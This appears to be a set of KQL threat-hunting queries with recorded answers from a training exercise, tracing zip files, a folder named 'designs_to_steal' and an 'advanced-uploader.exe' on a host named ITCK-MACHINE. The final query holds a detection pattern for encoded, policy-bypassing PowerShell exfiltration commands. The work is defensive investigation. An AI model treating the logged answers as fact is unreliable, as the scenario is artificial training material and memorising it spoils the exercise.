FileCreationEvents
| where hostname == "ITCK-MACHINE"
| order by timestamp desc
//
//How many of these zip files were created on Megan's machine?

FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where filename contains ".zip"
| count 

//What folder were the zip files placed in on Megan's machine?
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where path contains ".zip" and filename contains ".zip"
| project timestamp, path
//designs_to_steal, 2024-10-02T08:02:53.000Z to 2024-10-02T08:04:57.000Z

//What is the timestamp for when this file was created?
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where path contains "advanced-uploader.exe"
| project timestamp, path
//2024-10-02T08:36:47.000Z

//Was this process executed on Megan's machine?(Yes/No)
ProcessEvents
| where hostname == "ITCK-MACHINE"
| where process_name == "advanced-uploader.exe"

//What is the full URL where the files were exfiltrated to?
ProcessEvents
//| where hostname == "ITCK-MACHINE"
| where process_commandline contains "enc" and  process_commandline contains "bypass"
|distinct process_commandline
